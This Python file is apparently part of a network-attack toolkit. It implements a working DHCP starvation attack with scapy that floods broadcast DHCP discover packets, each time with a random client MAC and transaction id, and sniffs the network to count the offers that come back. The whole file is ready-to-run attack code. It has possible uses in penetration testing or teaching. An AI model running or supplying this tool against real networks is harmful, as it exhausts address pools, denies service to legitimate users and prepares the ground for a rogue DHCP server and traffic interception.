try:
    #Import general
    import socket, sys, string
    #Import local
    from netlib import *
    #Import 3rd party
    import netaddr, netifaces
    from scapy.all import *
    from prettytable import PrettyTable
    from sty import fg, bg, ef, rs
    import keyboard
except Exception as e:
    print (e)
    sys.exit()

#global variables
dhcp_list = []
num_dhcp_offers = 0
dhcp_offer_ip = "none"
stopFlag = False

def dhcpAttack(selectedInterface):
    global stopFlag, num_dhcp_offers, dhcp_list, dhcp_offer_ip

    while(1): #dhcp attack main while loop

        stopFlag = False
        dhcp_list = []
        num_dhcp_offers = 0
        dhcp_offer_ip = "none"
        rsm = False

        os.system('cls' if os.name == 'nt' else 'clear')
        printTitle("DHCP Attack")
        print(fg.li_yellow + "Press e to exist\n" + fg.rs)

        sourceMAC, rsm = getSourceMAC(selectedInterface)
        if sourceMAC == "e":
            return
        sendInterval = getInterval()
        if sendInterval == "e":
            return
        dhcpXid = random.randrange(1,1000000)

        pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=sourceMAC)/ \
            IP(src="0.0.0.0",dst="255.255.255.255") / \
            UDP(sport=68,dport=67)/ \
            BOOTP(op=1, xid=int(dhcpXid), chaddr=sourceMAC)/ \
            DHCP(options=[("message-type",'discover'),("end")])

        #start keyboard detection to check if user pressed q
        stopThread = threading.Thread(target=stopDHCP, args=(),daemon=True)
        stopThread.start()

        #start DHCP sniffing to check offers
        sniffThread = threading.Thread(target=sniffDHCP, args=(selectedInterface,sendInterval),daemon=True)
        sniffThread.start()

        os.system('cls' if os.name == 'nt' else 'clear')

        #number of packets sent
        i = 0
        printTitle("DHCP Attack")
        print(fg.li_yellow + "Press q to stop ...\n" + fg.rs)

        printPacket(pkt)

        while(1):
            try:
                sendp(pkt,iface=selectedInterface['name'], verbose=False)
            except Exception as e:
                print(e)

            #print number of packets sent
            print (str(i) + " packets sent, " + str(num_dhcp_offers) + " offers, last offer is " + dhcp_offer_ip, end="\r")
            i = i + 1

            #sleep based on interval entered
            time.sleep(sendInterval)

            pkt[BOOTP].chaddr = str(RandMAC())
            pkt[BOOTP].xid = random.randrange(1,1000000)

            if stopFlag == True:
                time.sleep(0.5)
                break

def sniffDHCP(selectedInterface, interval):
    global stopFlag
    while (1):
       dhcp_pkts = sniff(filter="dst port 68", iface=selectedInterface['name'], prn=check_dhcp_pkt, count=1, timeout=interval+1)
       if stopFlag == True:
           break

def stopDHCP():
    global stopFlag
    while (1):
        try:
            if keyboard.is_pressed('q'):
                stopFlag = True
                os.system('cls')
                keyboard.write('\b')
                break
        except:
            break

def check_dhcp_pkt(dhcp_pkt): # Handeling DHCP sniffed packets to count number of Offers
        global num_dhcp_offers, dhcp_list, dhcp_offer_ip
        # offer is message type 2, ack is message type 5
        try:
            msg_type = dhcp_pkt[0][1][DHCP].options[0][1]
            if msg_type == 2:
                num_dhcp_offers+= 1
                dhcp_server = dhcp_pkt[0][1][DHCP].options[1][1]
                dhcp_offer_ip = dhcp_pkt[0][1][BOOTP].yiaddr
                if dhcp_server not in dhcp_list:
                    dhcp_list.append(dhcp_server)
        except Exception as e:
            pass